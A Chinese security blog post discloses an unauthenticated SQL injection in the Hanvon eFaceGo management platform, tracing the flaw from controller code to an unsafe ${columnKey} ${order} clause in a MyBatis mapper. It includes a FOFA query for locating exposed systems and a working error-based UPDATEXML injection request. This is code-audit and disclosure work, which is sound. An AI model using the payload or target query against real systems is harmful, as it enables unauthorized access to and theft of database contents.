---
title: "汉王e脸通综合管理平台 queryVehicleAccessRecord.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryVehicleAccessRecord-sqli.html
asset_dir: embedded-base64
---

# 汉王e脸通综合管理平台 queryVehicleAccessRecord.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/31 12:37
- 838浏览
- [0评论](#comment)
- 44分钟阅读

深入探索

应用程序

身份验证

软件

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryVehicleAccessRecord.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

SQL

计算机安全

应用

直接看 `VehicleAccessRecordController` 里关于 `queryVehicleAccessRecord` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/queryVehicleAccessRecord.do"},
        method = {RequestMethod.GET}
    )
    public RequestJson queryVehicleAccessRecord(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "enterStartTime") String enterStartTime, @RequestParam(required = false,value = "enterEndTime") String enterEndTime, @RequestParam(required = false,value = "exitStartTime") String exitStartTime, @RequestParam(required = false,value = "exitEndTime") String exitEndTime, @RequestParam(required = false,value = "plateNum") String plateNum, @RequestParam(required = false,value = "carType") String carType, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson result = new RequestJson();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            VehicleAccessRecordParam vehicleAccessRecordParam = new VehicleAccessRecordParam();
            vehicleAccessRecordParam.setPlateNum(plateNum);
            if (carType != null) {
                vehicleAccessRecordParam.setCarType(carType);
            }

            vehicleAccessRecordParam.setColumnKey(columnKey);
            vehicleAccessRecordParam.setOrder(order);
            vehicleAccessRecordParam.setEnterStartTime(enterStartTime);
            vehicleAccessRecordParam.setEnterEndTime(enterEndTime);
            vehicleAccessRecordParam.setExitStartTime(exitStartTime);
            vehicleAccessRecordParam.setExitEndTime(exitEndTime);
            PageHelper.startPage(page, pageSize);
            List<VehicleAccessRecord> list = this.vehicleAccessRecordAsm.queryVehicleAccessRecord(vehicleAccessRecordParam);
            PageInfo<VehicleAccessRecord> info = new PageInfo(list);
```

深入探索

数据库

鉴权

安全

跟进`queryVehicleAccessRecord`方法

```
List<VehicleAccessRecord> queryVehicleAccessRecord(VehicleAccessRecordParam var1);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 VehicleAccessRecordVesm.xml

```
<!--查询视图-->
  <select id="queryVehicleAccessRecord" parameterType="com.hanvon.iface.tpm.vehicle.param.VehicleAccessRecordParam" resultMap="BaseResultMap">
    SELECT VC.PLATENUM, VC.USERID, VC.NAME, VC.CARTYPE, VC.CARDTYPE, VC.ENTERPASSAGE, VC.EXITPASSAGE,
    VC.ENTERTIME, VC.EXITTIME
    FROM v_car_passrecord VC
    WHERE 1 = 1
    <if test="plateNum != null">
      AND VC.PLATENUM like CONCAT('%',#{plateNum,jdbcType=VARCHAR},'%')
    </if>
    <if test="carType != null">
      AND VC.CARTYPE = #{carType}
    </if>
    <if test="enterStartTime != null and enterEndTime != null">
      AND VC.ENTERTIME &gt; #{enterStartTime,jdbcType=VARCHAR} AND #{enterEndTime,jdbcType=VARCHAR} &gt; VC.ENTERTIME
    </if>
    <if test="exitStartTime != null and exitEndTime != null">
      AND VC.EXITTIME &gt; #{exitStartTime,jdbcType=VARCHAR} AND #{exitEndTime,jdbcType=VARCHAR} &gt; VC.EXITTIME
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      VC.ENTERTIME desc
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 本地复现没有 v\_car\_passrecord 这个表

```
GET /manage/vehicleAccessRecord/queryVehicleAccessRecord.do?branchId=1&columnKey=AND+(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&deviceName=test&id=1&order=desc&page=1&pageSize=10&recoToken=SGUsqvF7cVS&type=1&start=2025-06-25&end=2025-06-25&sn=111111 HTTP/1.1
Host: hanvon.mrxn.net
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
